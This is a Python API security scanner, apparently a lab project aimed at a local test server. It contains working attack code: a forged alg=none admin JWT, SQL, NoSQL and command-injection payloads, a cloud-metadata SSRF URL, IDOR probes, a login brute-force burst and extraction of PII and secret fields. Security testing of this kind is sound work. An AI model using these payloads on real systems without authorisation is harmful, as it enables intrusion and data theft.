#!/usr/bin/env python3
"""
api_scanner.py — Advanced API Security Testing Toolkit (Project #62)
Tests 7 vulnerability classes against a target API.
"""
import os, sys, json, time, base64
from datetime import datetime
import requests

TARGET = "http://127.0.0.1:5001"
REPORTS_DIR = "reports"
os.makedirs(REPORTS_DIR, exist_ok=True)

# Common endpoint paths
ENDPOINT_PATHS = [
    "/swagger.json", "/api-docs", "/openapi.json",
    "/graphql", "/api/graphql",
    "/api/v1", "/api/v2", "/rest",
    "/api/docs", "/api/users", "/api/login",
    "/api/search", "/api/ping", "/api/admin/users",
]

# SQLi/XSS/NoSQLi payloads
INJECTION_PAYLOADS = {
    "SQLi":    [{"username": "admin' OR '1'='1", "password": "x"}],
    "NoSQLi":  [{"query": {"$ne": None}}],
    "CMDi":    [{"host": "127.0.0.1; id"}],
    "SSRF":    [{"url": "http://169.254.169.254/latest/meta-data/"}],
}

# PII/secret patterns
PII_KEYS = ["email", "phone", "ssn"]
SECRET_KEYS = ["password", "token", "key", "api_key", "secret"]

class APIScanner:
    def __init__(self, target=TARGET):
        self.target = target
        self.report = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "phases": {},
        }

    # ------------------------------------------------------------------
    def phase1_discovery(self):
        print("\n[PHASE 1] ENDPOINT DISCOVERY")
        found = []
        for path in ENDPOINT_PATHS:
            try:
                r = requests.get(self.target + path, timeout=3)
                if r.status_code < 500:
                    found.append({"path": path, "status": r.status_code})
                    print(f"    {path}: {r.status_code}")
            except Exception:
                pass
        print(f"    [+] {len(found)} endpoints discovered")
        self.report["phases"]["discovery"] = found

    # ------------------------------------------------------------------
    def phase2_auth(self):
        print("\n[PHASE 2] AUTHENTICATION TESTING")
        results = {}

        # Test 1: No auth on /api/users
        print(f"\n    [NO_AUTH] /api/users without token")
        try:
            r = requests.get(f"{self.target}/api/users", timeout=3)
            if r.status_code == 200 and "users" in r.text:
                print(f"      [+] VULNERABLE! User data exposed ({len(r.text)} bytes)")
                results["no_auth"] = {"vulnerable": True, "size": len(r.text)}
            else:
                results["no_auth"] = {"vulnerable": False}
        except Exception as e:
            print(f"      [!] {e}")

        # Test 2: alg=none JWT
        print(f"\n    [ALG_NONE] Forging JWT with alg=none")
        # Header: {"alg":"none","typ":"JWT"}
        # Payload: {"sub":1,"role":"admin"}
        header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(b'{"sub":1,"role":"admin"}').rstrip(b"=").decode()
        forged = f"{header_b64}.{payload_b64}."
        try:
            r = requests.get(f"{self.target}/api/users/1",
                             headers={"Authorization": f"Bearer {forged}"}, timeout=3)
            if r.status_code == 200:
                print(f"      [+] VULNERABLE! Access with forged token")
                results["alg_none"] = {"vulnerable": True}
            else:
                results["alg_none"] = {"vulnerable": False, "status": r.status_code}
        except Exception as e:
            print(f"      [!] {e}")

        # Test 3: API key leak in URL
        print(f"\n    [API_KEY_LEAK] Testing API key in URL")
        try:
            r = requests.get(f"{self.target}/api/users?api_key=AKIAIOSFODNN7EXAMPLE", timeout=3)
            if r.status_code == 200 and "users" in r.text:
                print(f"      [+] VULNERABLE! API key accepted in URL")
                results["api_key_url"] = {"vulnerable": True}
        except Exception:
            pass

        self.report["phases"]["auth"] = results

    # ------------------------------------------------------------------
    def phase3_authz(self):
        print("\n[PHASE 3] AUTHORIZATION TESTING")
        results = {}

        # Test 1: IDOR on /api/users/1, /api/users/2, /api/users/3
        print(f"\n    [IDOR] Accessing user IDs 1-3 without auth")
        idor_found = []
        for uid in [1, 2, 3]:
            try:
                r = requests.get(f"{self.target}/api/users/{uid}", timeout=3)
                if r.status_code == 200 and "username" in r.text:
                    idor_found.append(uid)
                    print(f"      [+] User {uid} exposed")
            except Exception:
                pass
        if idor_found:
            results["idor"] = {"vulnerable": True, "users": idor_found}
        else:
            results["idor"] = {"vulnerable": False}

        # Test 2: Admin endpoint
        print(f"\n    [ADMIN_ACCESS] /api/admin/users without auth")
        try:
            r = requests.get(f"{self.target}/api/admin/users", timeout=3)
            if r.status_code == 200 and "users" in r.text:
                print(f"      [+] VULNERABLE! Admin data exposed")
                results["admin_access"] = {"vulnerable": True, "size": len(r.text)}
        except Exception:
            results["admin_access"] = {"vulnerable": False}

        self.report["phases"]["authz"] = results

    # ------------------------------------------------------------------
    def phase4_injection(self):
        print("\n[PHASE 4] INJECTION TESTING")
        results = {}

        # SQLi
        print(f"\n    [SQLi] Testing ' OR '1'='1")
        try:
            r = requests.post(f"{self.target}/api/login",
                              json={"username": "admin' OR '1'='1", "password": "x"},
                              timeout=3)
            if "SQL injection" in r.text or "OR '1'='1" in r.text:
                print(f"      [+] VULNERABLE! SQL error reflected")
                results["sqli"] = {"vulnerable": True, "size": len(r.text)}
        except Exception as e:
            print(f"      [!] {e}")

        # NoSQLi
        print(f"\n    [NoSQLi] Testing {{'$ne': None}}")
        try:
            r = requests.post(f"{self.target}/api/search",
                              json={"query": {"$ne": None}},
                              timeout=3)
            if "NoSQL injection" in r.text or "$ne" in r.text:
                print(f"      [+] VULNERABLE! NoSQL injection")
                results["nosqli"] = {"vulnerable": True, "size": len(r.text)}
        except Exception as e:
            print(f"      [!] {e}")

        # CMDi
        print(f"\n    [CMDi] Testing ; whoami")
        try:
            r = requests.get(f"{self.target}/api/ping?host=127.0.0.1; id", timeout=5)
            if r.status_code == 200 and ("uid=" in r.text or "root" in r.text):
                print(f"      [+] VULNERABLE! Command execution")
                results["cmdi"] = {"vulnerable": True}
        except Exception:
            results["cmdi"] = {"vulnerable": False}

        self.report["phases"]["injection"] = results

    # ------------------------------------------------------------------
    def phase5_rate_limit(self):
        print("\n[PHASE 5] RATE LIMITING")
        results = {}

        print(f"\n    [BRUTEFORCE] Sending 20 login attempts in 1s")
        success = 0
        t0 = time.time()
        for i in range(20):
            try:
                r = requests.post(f"{self.target}/api/login",
                                  json={"username": f"user{i}", "password": "x"},
                                  timeout=2)
                if r.status_code == 200:
                    success += 1
            except Exception:
                pass
        elapsed = time.time() - t0
        rate = 20 / elapsed if elapsed > 0 else 0
        print(f"    Sent 20 requests in {elapsed:.2f}s ({rate:.1f} req/s)")

        if success >= 15:
            print(f"      [+] VULNERABLE! No rate limiting ({success}/20 passed)")
            results["bruteforce"] = {"vulnerable": True, "rate": rate}
        else:
            print(f"      [-] Rate limiting detected ({success}/20 passed)")
            results["bruteforce"] = {"vulnerable": False, "rate": rate}

        self.report["phases"]["rate_limit"] = results

    # ------------------------------------------------------------------
    def phase6_data_exposure(self):
        print("\n[PHASE 6] DATA EXPOSURE")
        results = {"pii": [], "secrets": []}

        try:
            r = requests.get(f"{self.target}/api/users", timeout=3)
            data = r.json()
            users = data.get("users", []) if isinstance(data, dict) else data

            for u in users:
                if isinstance(u, dict):
                    for k in u.keys():
                        if k.lower() in PII_KEYS and k not in results["pii"]:
                            results["pii"].append(k)
                        if k.lower() in SECRET_KEYS and k not in results["secrets"]:
                            results["secrets"].append(k)

            print(f"    [PII] Found: {', '.join(results['pii']) or 'none'}")
            print(f"    [SECRETS] Found: {', '.join(results['secrets']) or 'none'}")

            if results["pii"] or results["secrets"]:
                print(f"      [+] CRITICAL! PII and secrets exposed")
        except Exception as e:
            print(f"    [!] {e}")

        self.report["phases"]["data_exposure"] = results

    # ------------------------------------------------------------------
    def phase7_report(self):
        print("\n[PHASE 7] EXPLOITATION SUMMARY")

        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict) and v.get("vulnerable"):
                        confirmed.append(f"{phase}.{k}")
            elif isinstance(data, list):
                if phase == "discovery" and len(data) > 5:
                    confirmed.append(f"{phase}.endpoints ({len(data)})")

        print(f"\n    Total confirmed vulnerabilities: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/api_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    [OK] JSON: {json_path}")

        html_path = f"{REPORTS_DIR}/api_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    [OK] HTML: {html_path}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:3000]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>API Security Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>API Security Report</h1>
<p><b>Target:</b> {self.target}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p><b>Confirmed vulnerabilities:</b> {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print(" Advanced API Security Testing - Project #62")
        print("=" * 64)
        print(f"[+] Target: {self.target}")
        self.phase1_discovery()
        self.phase2_auth()
        self.phase3_authz()
        self.phase4_injection()
        self.phase5_rate_limit()
        self.phase6_data_exposure()
        self.phase7_report()

if __name__ == "__main__":
    if not sys.platform.startswith("linux"):
        print("ERROR: Linux only")
        sys.exit(1)
    APIScanner().run_all()
